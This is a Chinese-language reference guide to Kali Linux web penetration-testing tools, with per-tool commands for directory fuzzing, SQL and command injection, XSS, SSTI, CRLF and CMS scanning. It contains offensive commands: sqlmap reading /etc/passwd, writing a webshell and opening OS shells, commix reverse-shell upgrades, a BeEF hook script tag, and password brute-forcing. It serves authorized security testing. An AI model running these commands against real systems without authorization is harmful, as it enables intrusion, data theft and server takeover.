# Web 应用测试(Web Application Testing)

> **何时读本文件**:任务涉及 Web 应用渗透测试 —— 目录/参数/端点发现、SQL 注入、OS 命令注入、XSS、SSTI/CRLF 注入、CMS(WordPress/Joomla)识别与漏洞扫描、通用 Web 漏洞扫描、拦截代理审计等,且需要给出真实可执行的 Kali 工具命令时。

## 快速决策表

| 任务场景(OWASP 映射) | 首选工具 | 备选 | 关键区别 |
|---|---|---|---|
| 目录/文件爆破(信息收集) | ffuf | gobuster / feroxbuster / dirsearch | ffuf 的 FUZZ 关键字可放任意位置且过滤条件最灵活;feroxbuster 默认递归;gobuster 一工具多模式(dir/dns/vhost/fuzz) |
| 隐藏参数发现 | arjun | ffuf(参数位 fuzz) | arjun 专为参数发现设计,自动判断 GET/POST/JSON 有效参数 |
| SQL 注入检测与利用(A03) | sqlmap | jsql-injection / sqlsus / sqlninja | sqlmap 全能全 DBMS;sqlninja 专 MSSQL 接管;sqlsus 专 MySQL 控制台式利用 |
| OS 命令注入(A03) | commix | 手工 + Burp/ZAP Repeater | commix 自动测经典/盲注/伪终端并给出 os_shell |
| XSS 自动检测(A03) | xsser | ffuf + XSS payload 字典 | xsser 内置绕过编码与多种注入技术 |
| XSS 利用/浏览器控制(A03) | beef-xss | - | BeEF 需将 hook.js 注入到真实浏览器才能发挥威力 |
| Web 指纹/技术栈识别 | whatweb | wapiti(附带) | whatweb 900+ 插件,输出 CMS/框架/服务器/JS 库 |
| WordPress 专项扫描(A06) | wpscan | nikto | wpscan 需 WPScan API token 才能比对漏洞库 |
| Joomla 专项扫描(A06) | joomscan | nuclei | joomscan 自动出 HTML/TXT 报告 |
| 通用已知漏洞扫描(A06) | nuclei | nikto / wapiti / zaproxy | nuclei 模板化、误报低、速度快;nikto 偏服务器配置类问题;wapiti 偏应用逻辑黑盒注入 |
| 拦截代理/手动审计 | burpsuite | zaproxy / paros / webscarab / watobo | Burp 社区版手动测试体验最佳;ZAP 开源且自带主动扫描、支持 daemon/命令行 |
| SSTI 检测与利用(A03) | sstimap | tinja | sstimap 可利用并进交互 shell;tinja 覆盖 44 种模板引擎 |
| CRLF/响应头注入(A03) | crlfuzz | - | Go 编写,支持单 URL 与批量文件 |
| WebDAV 上传利用(A05) | davtest | - | 自动测 PUT 上传与脚本执行 |
| 子域接管(A05/A01) | subjack | nuclei(tags takeover) | subjack 并发扫描 CNAME 指向已释放资源 |
| WebDAV/老牌全站爬扫 | - | skipfish / dirb / dirbuster | 备用与补充手段 |

**典型链路**:`whatweb` 指纹 → `nuclei`/`nikto` 已知漏洞 → `ffuf`/`gobuster` 目录与端点 → `arjun` 隐藏参数 → `sqlmap`/`commix` 注入利用 → `burpsuite`/`zaproxy` 手动深入。CMS 站点直接 `wpscan`/`joomscan` 优先。

## 核心工具详解

### ffuf — 最常用的快速 Web Fuzzer(Go)

**用途**:目录/文件发现、虚拟主机发现、GET/POST 参数 fuzz;FUZZ 关键字可置于 URL 路径、查询串、请求头、POST 体任意位置。
**安装**:`sudo apt install ffuf`(Kali 默认已装)
**使用场景**:需要精细控制过滤(状态码/字节数/行数/正则)、需要挂代理观察流量、或做参数/主机头 fuzz 时选它;单纯递归扫目录可用 feroxbuster 省事。

```bash
# 基础目录爆破(FUZZ 关键字会被替换为字典词)
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<target>/FUZZ

# 递归扫描 + 扩展名 + 自动校准(剔除误报)
ffuf -w <wordlist> -u http://<target>/FUZZ -recursion -recursion-depth 2 -e .php,.html,.bak -ac

# 过滤:状态码 / 响应字节数 / 行数 / 词数(先看一次默认响应再填 <size>)
ffuf -w <wordlist> -u http://<target>/FUZZ -mc 200,301,302 -fc 404 -fs <size>
ffuf -w <wordlist> -u http://<target>/FUZZ -fc 404,403 -fl <lines>

# 虚拟主机发现(无 DNS 记录的 vhost,按响应大小差异判断)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<target> -H "Host: FUZZ.<domain>" -fs <size>

# GET 参数名 fuzz(配合 arjun)
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://<target>/?FUZZ=test" -fs <size>

# POST 参数 fuzz / 结果落盘 / 挂 Burp 代理
ffuf -w <wordlist> -u http://<target>/login -X POST -d "username=FUZZ&password=x" -fc 401
ffuf -w <wordlist> -u http://<target>/FUZZ -o results.json -of json
ffuf -w <wordlist> -u http://<target>/FUZZ -x http://127.0.0.1:8080
```

**实战要点**:
- `-ac` 自动校准可消除大量软 404 误报;自定义错误页用 `-fs`/`-mr <regex>` 过滤。
- Kali 常用字典:`/usr/share/wordlists/dirb/common.txt`;更全的装 `sudo apt install seclists`(位于 `/usr/share/seclists/`)。
- 目录结果要交叉验证 `FUZZ` 与 `FUZZ/`(目录)以及 `.bak/.old/.zip` 备份扩展。

### gobuster — 多模式目录/DNS/vHost 爆破器(Go)

**用途**:子命令式工具,一个二进制覆盖 `dir`(目录)、`dns`(子域)、`vhost`(虚拟主机)、`fuzz`(任意位置)四种爆破。
**安装**:`sudo apt install gobuster`(Kali 默认已装)
**使用场景**:需要 DNS 子域枚举或不想记多个工具时;速度与 ffuf 同级,但过滤能力弱于 ffuf。

```bash
# 目录爆破 + 扩展名
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,bak -t 50 -k

# 排除状态码、走代理
gobuster dir -u http://<target>/ -w <wordlist> -b 403,404 --proxy http://127.0.0.1:8080

# DNS 子域枚举(解析 IP 默认显示;-c 顺带检查 CNAME)
gobuster dns -do <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 虚拟主机发现
gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# 任意位置 fuzz(FUZZ 关键字)
gobuster fuzz -u http://<target>/FUZZ -w <wordlist>
```

**实战要点**:
- `dir` 模式默认黑名单排除 404(status-codes-blacklist 默认 404),其余状态码均报告;`-s` 白名单 / `-b` 黑名单可自定义;`-k` 跳过 TLS 证书校验。
- `dns` 模式先测通配符解析(自动提示 wildcard),通配符域会全量误报,需换字典或后处理。
- 与 ffuf 分工:gobuster 管 DNS 子域和快速目录,ffuf 管参数/vhost/复杂过滤。

### arjun — HTTP 隐藏参数发现套件(Python)

**用途**:探测 URL 端点(GET/POST/JSON/XML)中存在但前端未暴露的参数;隐藏参数常是 SQL 注入/越权入口。
**安装**:`sudo apt install arjun`
**使用场景**:目录扫完后、进入 sqlmap/commix 前,先用 arjun 找全参数面;ffuf 参数名爆破只测"参数名存在响应差异",arjun 还会带真实值做多轮确认,准确率更高。

```bash
# 探测 GET 参数
arjun -u http://<target>/page.php

# 探测 POST / JSON 参数
arjun -u http://<target>/api -m POST
arjun -u http://<target>/api -m JSON

# 批量 URL、输出参数清单、目标不稳定时降速
arjun -i <file> -oT params.txt
arjun -u <url> --stable -c 5
```

**实战要点**:
- 发现的参数直接喂给后续利用:`sqlmap -u "<url>?<param>=1"`、`commix -u "<url>?<param>=test"`。
- `--stable` 用低并发+单线程,适合有 WAF 或易 502 的目标。
- 输出的参数同样适用于 Burp Repeater 手工测试。

### feroxbuster — 递归内容发现(Rust)

**用途**:强制浏览(Forced Browsing),递归爆破未链接目录/文件,默认即递归;Rust 实现,速度极快。
**安装**:`sudo apt install feroxbuster`
**使用场景**:想"一条命令扫到底"的深递归目录发现;比 ffuf+`-recursion` 更省配置,还支持从页面提取链接再 fuzz。

```bash
# 基础递归扫描
feroxbuster -u http://<target>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -d 2 -t 50

# 扩展名 + 提取页面内链接 + 过滤 404/403
feroxbuster -u http://<target>/ -w <wordlist> --extensions php,bak,zip --extract-links --filter-status 404,403

# 输出结果、忽略 TLS、挂代理
feroxbuster -u http://<target>/ -w <wordlist> -k -o found.txt --proxy http://127.0.0.1:8080
```

**实战要点**:
- 默认深度 4,大站注意控制 `-d` 和 `-t` 避免打挂目标或触发 WAF。
- `--filter-size <bytes>` 过滤统一错误页,与 ffuf 的 `-fs` 等价。
- 适合作为 ffuf 的"懒人版"替代,尤其在需要大量扩展名组合时。

### dirsearch — 功能型 Web 路径扫描器(Python)

**用途**:命令行目录/文件爆破,自带默认字典与扩展名逻辑,递归、多协议、批量目标。
**安装**:`sudo apt install dirsearch`
**使用场景**:需要按扩展名组合快速扫描、或从 URL 列表批量跑;比 ffuf 慢但默认配置更"开箱即用"。

```bash
# 基础扫描(指定扩展名)
dirsearch -u http://<target>/ -e php,html,bak

# 递归 + 深度 + 线程 + 自定义字典
dirsearch -u http://<target>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -r -R 2 -t 30

# 批量目标、排除状态码、随机 UA
dirsearch -l urls.txt -e php -x 403,404 --random-agent
```

**实战要点**:
- `-r` 开递归、`-R 2` 限递归深度,防扫描爆炸。
- 结果默认写 `reports/` 目录,便于留档。
- 与 ffuf 并用:dirsearch 快速过一遍默认配置,可疑路径再用 ffuf 精细 fuzz。

### wfuzz — 经典 Web 应用暴力 Fuzzer(Python)

**用途**:对未链接资源、GET/POST 参数、表单做暴力枚举,可测 SQL/XSS/LDAP 等注入向量;FUZZ 关键字机制的老前辈。
**安装**:`sudo apt install wfuzz`(Kali 默认已装)
**使用场景**:需要 Python 生态、多重 payload 组合(`-z` 可叠多段 FUZZ、FUZ2Z)或按响应行/字/字符多维过滤时。

```bash
# 目录爆破:彩色输出 + 字典 payload + 隐藏 404(官网示例)
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://<target>/FUZZ

# 过滤维度:--hc/--hl/--hw/--hh(状态码/行数/词数/字符数)
wfuzz -c -z file,<wordlist> --hc 404 --hh <chars> http://<target>/FUZZ

# POST 参数爆破
wfuzz -c -z file,<wordlist> -d "user=FUZZ&pass=test" --hc 401 http://<target>/login

# 请求头 fuzz(如 Host 头注入)
wfuzz -c -z file,<wordlist> -H "X-Forwarded-For: FUZZ" --hc 404 http://<target>/
```

**实战要点**:
- 官方字典位于 `/usr/share/wfuzz/wordlist/`,分 general/ 技术栈/ 参数名等目录。
- 双 payload 用 `FUZ2Z` 第二关键字:`-z file,a.txt -z file,b.txt url/FUZZFUZ2Z`。
- 现代 Kali 中多数场景被 ffuf 取代,但多维过滤语法仍适合精细任务。

### sqlmap — 自动 SQL 注入检测与利用(重点工具)

**用途**:检测并利用 SQL 注入:DBMS 指纹、枚举库/表/列、脱库、破解口令哈希、文件读写、OS shell、支持绕 WAF 的 tamper 脚本。
**安装**:`sudo apt install sqlmap`(Kali 默认已装)
**使用场景**:发现可疑参数(尤其配合 arjun/Burp)后进行自动化注入验证与数据提取;命令注入请用 commix,别用 sqlmap。

```bash
# 基础检测 + 枚举数据库(官网示例模式,--batch 自动回答交互)
sqlmap -u "http://<target>/?p=1&forumaction=search" --dbs --batch

# 从 Burp/ZAP 保存的原始请求文件导入(保留 Cookie/头/POST,首选方式)
sqlmap -r request.txt --batch --dbs

# POST 参数 + 指定注入点参数
sqlmap -u "http://<target>/login.php" --data="user=test&pass=test" -p user --dbs

# 自动提取页面表单并测试
sqlmap -u "http://<target>/search.php" --forms --batch --dbs

# 提高检测强度:level 1-5(参数覆盖面), risk 1-3(3 含 OR/时间盲注,危险)
sqlmap -u "<url>" --level=5 --risk=3 --dbs

# 枚举链路:当前用户/库 → 全部用户与口令哈希 → 表 → 列 → 脱库
sqlmap -u "<url>" --current-user --current-db --hostname --batch
sqlmap -u "<url>" --users --passwords --privileges --batch
sqlmap -u "<url>" -D <db> --tables
sqlmap -u "<url>" -D <db> -T <table> --columns
sqlmap -u "<url>" -D <db> -T <table> --dump --start=1 --stop=20
sqlmap -u "<url>" -D <db> --dump-all --exclude-sysdbs

# 全库搜索列名(找密码列)
sqlmap -u "<url>" --search -C username,password

# 文件读取/写入(需高权限或 DBA)
sqlmap -u "<url>" --file-read="/etc/passwd"
sqlmap -u "<url>" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# OS shell / SQL 交互 shell
sqlmap -u "<url>" --os-shell
sqlmap -u "<url>" --sql-shell

# tamper 绕 WAF/过滤(可逗号组合)
sqlmap -u "<url>" --tamper=space2comment,between,randomcase --dbs
ls /usr/share/sqlmap/tamper/   # 查看全部 80+ tamper 脚本

# 批量目标
sqlmap -m urls.txt --batch --dbs        # URL 列表文件
sqlmap -g "inurl:php?id=" --batch       # Google dork 批量(需可访问搜索引擎)
sqlmap -u "http://<target>/" --crawl=3 --batch   # 爬取站点自动测全部带参链接

# 其他高频参数
--dbms=mysql              # 锁定后端 DBMS,加速并减少探测流量
--technique=BEUSTQ        # 指定注入技术 B布尔 E报错 U联合 S堆叠 Q内联查询
--threads=10              # 并发(仅时间盲注等场景勿开高)
--cookie="PHPSESSID=abc"  # 会话保持;认证目标配合 --auth-type/--auth-cred
--csrf-token=<token参数名> # 自动获取并回填 CSRF token
--proxy=http://127.0.0.1:8080  # 经 Burp 观察注入流量(调试 payload 必备)
--delay=1 --timeout=30    # 限速与超时,降低目标压力
--flush-session --fresh-queries  # 重测时清空目标缓存结果
-v 6                      # 最高详细度,可看到完整 payload(调试用)
```

**常用 tamper 速查**:`space2comment`(空格→`/**/`,绕空格过滤)、`between`(比较符→BETWEEN,绕 `<`/`>` 过滤)、`randomcase`(随机大小写)、`charencode`/`charunicodeencode`(编码)、`equaltolike`(=→LIKE)、`apostrophenullencode`/`unmagicquotes`(绕引号转义/magic_quotes)、`space2plus`(空格→`+`)、`percentage`(IIS/ASP+WAF)、`halfversionedmorekeywords`、`modsecurityversioning`(MySQL 绕 ModSecurity)。

**实战要点**:
- 自动化必加 `--batch`;复测同一 URL 默认读缓存,换 payload 前加 `--flush-session`。
- 时间盲注(`--technique=T` 或自动命中)时严禁高 `--threads`,否则时间误差导致大量误报。
- `--os-shell` 依赖堆叠注入或文件写权限;MySQL 下常见路径是 `--file-write` webshell 再走 Web 访问。
- 脱库密码哈希会自动调 john/hashcat 尝试破解(需已安装);`--passwords` 直接取 DBMS 账户口令。

### commix — 自动 OS 命令注入检测与利用

**用途**:自动化检测经典(回显)、盲(时间)、文件写入等命令注入技术,成功后进入 Pseudo-Terminal(os_shell)。
**安装**:`sudo apt install commix`
**使用场景**:参数被拼进系统命令(ping、文件名处理、压缩/导出等场景)时;与 sqlmap 是姊妹工具,一个管 SQL 一个管 shell 命令。

```bash
# 基础检测 GET 参数
commix -u "http://<target>/ping.php?ip=127.0.0.1" --batch

# 官网示例模式:深入测 HTTP 头注入(Referer 等),level 3 会测 cookie/header
commix --url="http://<target>/<path>.php" --level=3

# POST 参数 / Cookie / 自定义头
commix -u "http://<target>/api" --data="host=127.0.0.1" --batch
commix -u "<url>" --cookie="session=<value>" --headers="X-Forwarded-For: 127.0.0.1"

# 直接要 OS shell / 单命令执行
commix -u "<url>?cmd=inject" --os-shell
commix -u "<url>?cmd=inject" --os-cmd=whoami

# tamper 绕过滤
commix -u "<url>" --tamper=base64encode --batch
```

**实战要点**:
- os_shell 内置 `reverse_tcp`/`bind_tcp` 子命令,可直接升级反弹 shell(需本地监听)。
- 默认注入点检测完后按回车默认值即可;全自动化加 `--batch`。
- 检测不到时提高 `--level`(会覆盖更多注入位置:cookie、UA、Referer),再手工用 Burp Repeater 验证。

### beef-xss — 浏览器利用框架(BeEF)

**用途**:通过 hook.js 控制被 XSS 感染的浏览器,对被钩住(hooked)的浏览器执行社会工程、信息收集、内网探测等模块。
**安装**:`sudo apt install beef-xss`
**使用场景**:已找到存储型/反射型 XSS 且能在授权环境内让真实浏览器加载 hook 脚本时,评估客户端侧实际风险;xsser 负责找洞,BeEF 负责利用洞。

```bash
# 启动 BeEF 服务并打开控制台(Kali 包装脚本)
sudo beef-xss
# 输出: Web UI: http://127.0.0.1:3000/ui/panel
#       Hook: <script src="http://<ip>:3000/hook.js"></script>

# 停止服务
sudo beef-xss-stop
```

**实战要点**:
- 控制台凭据在安装时设置,配置文件为 `/etc/beef-xss/config.yaml`(可改监听 IP/端口、扩展模块)。
- 把 Hook URL 当作 XSS payload 注入目标页面;浏览器一旦加载 hook.js,即出现在 Online Browsers 列表。
- 目标与 BeEF 不同源时会受同源策略限制,优先选存储型注入点;内网测试可让 BeEF 监听 0.0.0.0。

### xsser — XSS 自动检测框架

**用途**:自动化检测、利用、绕过过滤的 XSS 框架,内置多套 payload 与编码/混淆技巧,支持输出报告与 GUI 向导。
**安装**:`sudo apt install xsser`
**使用场景**:需要对大量 URL/参数批量撒 XSS payload、或需要自动尝试过滤绕过时;比 ffuf+字典更"懂 XSS"。

```bash
# 对目标 URL 自动检测
xsser -u "http://<target>/search.php?q=XSS" --auto

# 注入自定义 payload(--Fp 最终 payload)
xsser -u "http://<target>/search.php?q=XSS" --Fp "<script>alert(1)</script>"

# 启动 GTK 图形界面(向导式配置)
xsser --gtk
```

**实战要点**:
- 确认注入后,把 payload 换成 BeEF hook 地址形成完整利用链。
- `--auto` 只做检测不"打"浏览器;写报告/取证再考虑手动 payload。
- 现代复杂前端(SPA、CSP)下自动化命中率有限,兜底手段仍是 Burp 手工注入。

### whatweb — Web 技术栈指纹识别(Ruby)

**用途**:识别 CMS、博客平台、统计包、JS 库、Web 服务器、嵌入式设备等 900+ 插件,还能提取版本号、邮箱、SQL 报错等。
**安装**:`sudo apt install whatweb`(Kali 默认已装)
**使用场景**:任何 Web 测试的第一步;确定 CMS/框架后决定走 wpscan/joomscan、nuclei 指定标签,还是通用漏扫。

```bash
# 激进模式详细报告(官网示例)
whatweb -v -a 3 <target>

# 快速批量(IP 段/列表文件),不报错误
whatweb --no-errors -a 3 192.168.1.0/24
whatweb --no-errors -i hosts.txt

# 指定 UA / 代理;JSON 日志留档
whatweb -a 3 -U "Mozilla/5.0" <target>
whatweb -a 3 --log-json=whatweb.json <target>
```

**实战要点**:
- `-a` 激进度 1(默认,一次请求)到 3+(主动探测目录如 /admin、README);做隐蔽评估时保持 1。
- 输出的版本号直接喂给 `searchsploit <产品> <版本>` 查公开漏洞。
- 对 WAF/CDN 站点,记得带上真实业务路径(如 `/wordpress/`)再识别。

### wpscan — WordPress 黑盒漏洞扫描器

**用途**:扫描远程 WordPress:主题/插件枚举、版本比对、用户枚举、配置备份泄露、弱口令爆破;接入 WPVulnDB API 出漏洞情报。
**安装**:`sudo apt install wpscan`
**使用场景**:whatweb 确认 WordPress 后的必做步骤;用户枚举+`wp-login.php` 爆破是最常见入口。

```bash
# 枚举热门插件/主题/用户(基础)
wpscan --url http://<target>/ --enumerate u,t,p

# 全量枚举(慢)+ 配置备份 + 数据库导出泄露
wpscan --url http://<target>/ --enumerate ap,at,u,cb,dbe --plugins-detection aggressive

# 接入 WPScan 漏洞库(免费注册获取 API token)
wpscan --url http://<target>/ --enumerate vp,vt --api-token <token>

# 用户口令爆破(字典需先解压: gzip -d /usr/share/wordlists/rockyou.txt.gz)
wpscan --url http://<target>/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

**实战要点**:
- 无 API token 时只列版本/组件不出 CVE 比对,务必注册免费 token。
- `--enumerate u` 走 `?author=1` 枚举,若被防护改用 XML-RPC(`system.multicall`)或 wpscan 用户名字典。
- 发现 `xmlrpc.php` 开放时可配合爆破;发现过时插件先用 nuclei(`-tags wordpress`)验证已知漏洞。

### joomscan — OWASP Joomla 漏洞扫描器

**用途**:检测 Joomla CMS 版本、核心漏洞、目录列表、敏感文件、admin 后台位置、备份/日志文件等,自动生成报告。
**安装**:`sudo apt install joomscan`
**使用场景**:whatweb 确认 Joomla 后一键体检;输出即报告,适合交付。

```bash
# 扫描 Joomla 站点(官网示例)
joomscan -u http://<target>/

# Joomla 位于子目录时
joomscan -u http://<target>/joomla/

# 枚举已安装组件(漏洞高发区)
joomscan -u http://<target>/ -ec
```

**实战要点**:
- 报告输出在 `/usr/share/joomscan/report/<host>/`(HTML+TXT 双格式,注意目录名为单数 report)。
- 检出的"core not vulnerable"只针对核心版本,第三方组件才是 Joomla 被打穿的主因,`-ec` 枚举后逐个查 CVE。
- directory listing 结果(如 `/images/banners`)常直接泄露敏感文件,优先人工翻。

### nikto — 经典 Web 服务器安全扫描器(Perl)

**用途**:对 Web 服务器做 6700+ 检查项:危险文件/CGI、版本过时、配置问题、HTTP 头安全缺失等。
**安装**:`sudo apt install nikto`(Kali 默认已装)
**使用场景**:对服务器层面的配置类问题做快速体检(与 nuclei 的已知 CVE 漏洞互补);不支持 JS 渲染,SPA 站点效果差。

```bash
# 官网示例:HTML 报告 + 指定 Tuning 类别 + 过滤输出
nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host <target>

# 简单扫描
nikto -h http://<target>/

# 多端口 + SSL
nikto -h <target> -p 80,443 -ssl

# 排除 DoS 类测试、走 Burp 代理、HTTP 认证、限时
nikto -h <target> -Tuning x 6 -useproxy http://127.0.0.1:8080
nikto -h <target> -id <user>:<pass> -maxtime 30m
```

**实战要点**:
- Tuning 数字类别:1 有趣文件 2 配置错误 3 信息泄露 4 注入类 6 DoS(建议排除) b 软件识别 d WebService e 管理控制台(Administrative Console) 0 文件上传(File Upload);`x` 表示取反排除。
- 输出噪音大,重点看:过时组件版本、备份文件、`/server-status` 等信息泄露、HTTP 方法。
- 和 nuclei 并跑:nikto 管服务器配置,nuclei(`-tags cve,misconfig`)管精确漏洞。

### nuclei — 模板驱动的漏洞扫描器(Go)

**用途**:基于 YAML 模板对已知 CVE、配置错误、信息泄露、默认凭据等做精确匹配验证;支持 HTTP/DNS/TCP/文件多协议,误报极低。
**安装**:`sudo apt install nuclei`(Kali 默认已装)
**使用场景**:任何目标的第一轮已知漏洞扫描;大规模资产用 URL 列表批量;配合自写模板可做定制化检测。

```bash
# 单目标全模板扫描(默认已含 cve/misconfig/exposure 等)
nuclei -u http://<target> -o nuclei-results.txt

# 批量目标 + 限速(大规模资产必限速)
nuclei -l urls.txt -rl 100 -c 25 -o nuclei-results.txt

# 按严重级/标签过滤
nuclei -u http://<target> -severity critical,high
nuclei -u http://<target> -tags cve,exposure,misconfig
nuclei -l urls.txt -tags takeover -severity high

# 更新模板库(社区模板每日更新)
nuclei -update-templates

# 静默模式只输出命中行
nuclei -u http://<target> -silent -severity critical,high
```

**实战要点**:
- Kali 模板位于 `/usr/share/nuclei-templates/`(或 `~/nuclei-templates`),可用 `-t <dir>` 只跑子集。
- `-severity` 与 `-tags` 组合是控噪主力;对内网资产 `-tags exposure,token` 常直接翻出密钥泄露。
- 扫描结果中 `[critical]`/`[high]` 优先验证再写报告;nuclei 命中即可信度高但仍需人工复核 payload 是否真实生效。

### wapiti — 黑盒 Web 应用漏洞扫描器(Python)

**用途**:爬取站点后像 fuzzer 一样注入 payload,检测 XSS、SQL/盲注、命令执行、SSRF、XXE、CSRF、重定向、文件泄露等。
**安装**:`sudo apt install wapiti`
**使用场景**:需要"爬取+注入"一体化的黑盒扫描并出报告;对不需要登录的应用零配置即跑,SPA 支持弱于 ZAP。

```bash
# 基础扫描
wapiti -u http://<target>/

# 指定爬取范围 + 输出目录与格式
wapiti -u http://<target>/ --scope folder -o wapiti-report -f html

# 只跑/禁用指定模块、查看模块列表
wapiti -u http://<target>/ -m xss,sql,ssrf
wapiti --list-modules
wapiti -u http://<target>/ -m "-exec"   # 禁用命令执行模块(防止危害生产)

# 带 Cookie 扫描登录后区域
wapiti -u http://<target>/ -c "<cookie-string>"
```

**实战要点**:
- `--scope url|page|folder|domain` 控制爬取边界,授权范围外的子域务必限定。
- 结果在输出目录 `index.html`,按漏洞类别分页,含请求/响应证据。
- 与 nuclei 分工:nuclei 是签名级已知漏洞,wapiti 是注入级黑盒测试,两者互补。

### zaproxy — OWASP ZAP 全能 Web 渗透代理

**用途**:拦截代理 + 爬虫 + 主动/被动扫描器 + Fuzzer 一体;开源免费,支持 GUI、daemon 无头模式与命令行快速扫描。
**安装**:`sudo apt install zaproxy`(Kali 默认已装)
**使用场景**:Burp 社区版没有主动扫描器,ZAP 免费自带;需要 CI/CD 集成或 headless 扫描时选 ZAP。

```bash
# GUI 启动(默认代理 127.0.0.1:8080)
zaproxy

# 无头 daemon 模式(供其他工具挂代理)
zaproxy -daemon -port 8081 -host 127.0.0.1

# 命令行快速扫描并出报告(spider+scan 一条龙)
zaproxy -cmd -quickurl http://<target>/ -quickout zap-report.html
```

**实战要点**:
- 浏览器代理指向 ZAP 后先手动浏览,spider + Active Scan 的覆盖率取决于先爬到的 URL 质量。
- `-daemon` 模式配合 REST API(`/JSON`)可自动化集成;`-cmd -quickurl` 适合批量粗扫。
- 与 Burp 二选一时的取舍:ZAP 扫描强且免费,Burp 插件生态与手动体验强;可同时挂(级联代理)。

### burpsuite — Web 安全测试集成平台(社区版)

**用途**:拦截/修改请求、爬虫、Repeater/Decoder/Comparer 手动工具集;Kali 仓库版为免费社区版(无主动扫描器、Intruder 受限)。
**安装**:`sudo apt install burpsuite`(Kali 默认已装,社区版)
**使用场景**:所有需要手工验证的环节:分析参数、重放修改请求、验证注入 payload、测试越权;是半自动化工具(sqlmap/commix/ffuf)的指挥中心。

```bash
# 启动 GUI(内置监听 127.0.0.1:8080)
burpsuite

# 其他工具挂 Burp 代理观察/记录流量
sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --batch
ffuf -w <wordlist> -u http://<target>/FUZZ -x http://127.0.0.1:8080
```

**实战要点**:
- 在 Proxy→HTTP history 里右键 "Save items" 得到的请求文件可直接 `sqlmap -r` 使用,免去手工拼参数。
- 证书:浏览器访问 `http://burpsuite` 下载 CA 证书后才能拦截 HTTPS。
- 社区版做不了主动扫描,批量扫描交给 nuclei/wapiti/zaproxy,Burp 专注手工验证与利用。

### davtest — WebDAV 服务器利用测试

**用途**:测试 WebDAV 服务:能否 MKCOL 建目录、PUT 上传各类扩展名文件、上传的脚本是否可执行,快速判断 DAV 是否可利用。
**安装**:`sudo apt install davtest`
**使用场景**:nuclei/nikto 报告 `PUT`/WebDAV 方法启用、或目录爆破发现 WebDAV 目录时。

```bash
# 官网示例:扫描 WebDAV 服务器
davtest -url http://<target>/

# 指定子目录 + 认证 + 结束后清理上传物
davtest -url http://<target>/webdav/ -auth <user>:<pass> -cleanup

# 在指定后缀目录下创建测试目录
davtest -url http://<target>/ -directory <dir>
```

**实战要点**:
- 输出里只有 `PUT SUCCEED` 且 `EXEC SUCCEED` 的扩展名才可利用(常见 txt/html 能传但 php/asp 被拦)。
- 上传成功但执行失败时,尝试改后缀大小写、双扩展(`shell.php.txt`)或 MOVE 到可执行目录。
- 用完务必 `-cleanup` 或手工删除 DavTestDir 目录,避免留痕。

### sstimap — SSTI/代码注入自动检测与利用

**用途**:检测并利用服务端模板注入(SSTI)与代码注入,可交互执行系统命令;支持 URL/表单/请求头多注入点。
**安装**:`sudo apt install sstimap`
**使用场景**:目标使用 Jinja2/Twig/Freemarker/Velocity 等模板引擎、参数回显模板语法时;`${7*7}` 回显 49 即命中。

```bash
# 基础检测
sstimap -u http://<target>/page?name=test

# POST 数据 + Cookie + 自定义头注入点
sstimap -u http://<target>/api -d "name=test" -C "session=<value>"
sstimap -u http://<target>/ -H "X-Forwarded-For: 127.0.0.1"

# 批量 URL / 交互模式
sstimap --load-urls urls.txt
sstimap -i
```

**实战要点**:
- 检测成功后进入交互 shell 可直接执行系统命令(`--os-cmd` 类似);确认后建议手工构造稳定 payload。
- 与 tinja 分工:sstimap 检测+利用一体,tinja 引擎覆盖更广适合确认"是哪家模板引擎"。
- SSTI 高危(Jinja2/Twig 常直接 RCE),命中后立即评估影响并截图取证。

### tinja — 模板注入测试 CLI(Go)

**用途**:对网页做模板注入检测,覆盖 8 种语言 44 个主流模板引擎,自动识别引擎类型。
**安装**:`sudo apt install tinja`
**使用场景**:需要快速判断注入点是否为 SSTI、是哪一家模板引擎;与 sstimap 交叉验证。

```bash
# 检测 URL(自动遍历 payload 与引擎)
tinja url -u "http://<target>/page?name=test"

# POST 数据检测
tinja url -u "http://<target>/api" -X POST -d "name=test"

# 从文件批量检测
tinja file -f urls.txt
```

**实战要点**:
- 命中后按提示的引擎类型去查对应 RCE payload(不同引擎语法差异大)。
- 引擎识别失败但疑似存在时,手工用 `${7*7}`、`{{7*7}}`、`#set($x=7*7)${x}` 三连测。
- Go 实现、速度快,适合大列表初筛后再用 sstimap 精细利用。

### crlfuzz — CRLF 注入快速扫描(Go)

**用途**:检测 URL 中 CRLF(`%0d%0a`)注入,可导致响应头注入(set-cookie/XSS)、缓存投毒、请求走私。
**安装**:`sudo apt install crlfuzz`
**使用场景**:URL 参数被拼进 Location/Set-Cookie 等响应头、或重定向参数可控时。

```bash
# 单 URL 检测
crlfuzz -u "http://<target>/redirect?url=https://<domain>/"

# 从文件批量检测
crlfuzz -l urls.txt

# 指定 HTTP 方法
crlfuzz -u "<url>" -X POST
```

**实战要点**:
- 管道方式:`cat urls.txt | crlfuzz` 亦可(stdin 输入)。
- 命中后手工验证:注入 `%0d%0aSet-Cookie:xsstrue=1` 观察响应头是否分裂。
- CRLF 常与开放重定向同现,结合缓存层可升级为缓存投毒,报告时要写清影响链。

### subjack — 子域接管检测(Go)

**用途**:并发扫描子域列表,识别 CNAME 指向已释放/可注册资源(Heroku、GitHub Pages、AWS S3 等)导致的接管风险。
**安装**:`sudo apt install subjack`
**使用场景**:资产收集(gobuster dns/subfinder)拿到子域清单后做接管筛查。

```bash
# 基础扫描(线程 100 + HTTPS + 详细输出)
subjack -w subdomains.txt -t 100 -ssl -v

# 自定义指纹文件
subjack -w subdomains.txt -c fingerprints.json -t 100
```

**实战要点**:
- 工具明确提示:结果务必人工复核排除误报(部分服务有防接管处理)。
- 先 DNS 解析确认 CNAME(如 `dig <sub>.<domain> CNAME`),再判断指向服务是否可注册。
